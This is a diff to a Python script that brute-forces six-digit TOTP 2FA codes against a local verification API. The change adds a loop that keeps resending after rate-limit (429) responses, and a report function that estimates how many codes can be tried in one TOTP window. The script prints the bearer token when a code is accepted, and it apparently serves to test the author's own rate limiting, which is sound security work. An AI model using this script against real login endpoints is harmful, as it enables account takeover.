@@ -36,23 +36,38 @@ def try_code_possibility(user_id, email, code):
     url = "http://localhost:5001/verify-2fa"
     payload = {"user_id": user_id, "email": email, "code": code}
 
-    # Send the POST request to the API
-    response = requests.post(url, json=payload)
+    while 1:
+        # Send the POST request to the API
+        response = requests.post(url, json=payload)
 
-    # Check if the response is successful (200 is the correct code for https)
-    if response.status_code == 200:
-        print(f"\n\nSuccess! Code {code} is valid.")
-        print(f"Bearer token: {response.json().get('token')}")
-        return 0
-    elif response.status_code == 400:
-        print(f"Attempted code: {code}, response: Invalid 2FA code ({response.status_code})")
-        return 1
-    elif response.status_code == 404:
-        print(f"Attempted code: {code}, response: User or Secret not found ({response.status_code})")
-        return 1
-    elif response.status_code == 500:
-        print(f"Attempted code: {code}, response: Internal server error ({response.status_code})")
-        return 1
+        # Check if the response is successful (200 is the correct code for https)
+        if response.status_code == 200:
+            print(f"\n\nSuccess! Code {code} is valid.")
+            print(f"Bearer token: {response.json().get('token')}")
+            return 0
+        elif response.status_code == 400:
+            print(
+                f"Attempted code: {code}, response: Invalid 2FA code \
+                ({response.status_code})"
+            )
+            return 1
+        elif response.status_code == 404:
+            print(
+                f"Attempted code: {code}, response: User or Secret not found \
+                ({response.status_code})"
+            )
+            return 1
+        elif response.status_code == 429:
+            print(
+                f"Attempted code: {code}, response: Wait till it can be tried again \
+                ({response.status_code})"
+            )
+        elif response.status_code == 500:
+            print(
+                f"Attempted code: {code}, response: Internal server error \
+                ({response.status_code})"
+            )
+            return 1
 
 
 """
@@ -77,7 +92,7 @@ def brute_force_simple(user_id, email):
         if result == 0:
             print(
                 f"Brute-force attack completed in {end_time - start_time:.2f} \
-                    seconds with {attempts} attempts."
+                seconds with {attempts} attempts."
             )
             return 0
 
@@ -86,7 +101,7 @@ def brute_force_simple(user_id, email):
         if end_time - start_time > LIFECYCLE_TOTP:
             print(
                 f"Brute-force attack stopped after {end_time-start_time:.2f} \
-                    seconds with {attempts} attempts."
+                seconds with {attempts} attempts."
             )
             return 1
 
@@ -181,7 +196,7 @@ def brute_force_random(user_id, email):
         if result == 0:
             print(
                 f"Brute-force attack completed in {end_time - start_time:.2f} \
-                    seconds with {attempts} attempts."
+                seconds with {attempts} attempts."
             )
             return 0
 
@@ -190,7 +205,7 @@ def brute_force_random(user_id, email):
         if end_time - start_time > LIFECYCLE_TOTP:
             print(
                 f"Brute-force attack stopped after {end_time-start_time:.2f} \
-                    seconds with {attempts} attempts."
+                seconds with {attempts} attempts."
             )
             return 1
 
@@ -201,11 +216,15 @@ Print statements to get information about brute force attack
 
 
 def generate_report(user_id, email):
-    attempts = 1000
     start_time = time.time()
-    for code_num in range(attempts):
+    attempts = 0
+    for code_num in range(MAX_POSSIBLE_CODES):
         code = f"{code_num:06d}"
         try_code_possibility(user_id, email, code)
+        attempts += 1
+        end_time = time.time()
+        if end_time - start_time > LIFECYCLE_TOTP:
+            break
     end_time = time.time()
     time_of_single_attempt = (end_time - start_time) / attempts
     number_of_attempts_possible = LIFECYCLE_TOTP // time_of_single_attempt
@@ -214,7 +233,7 @@ def generate_report(user_id, email):
     print(f"Single attempt cost: {time_of_single_attempt} seconds.")
     print(
         f"Maximum number of tries before the TOTP resets: \
-            {number_of_attempts_possible} attempts"
+        {number_of_attempts_possible} attempts"
     )
     print(f"Possible codes tried before TOTP resets: {percentage_code_tried} %")
 
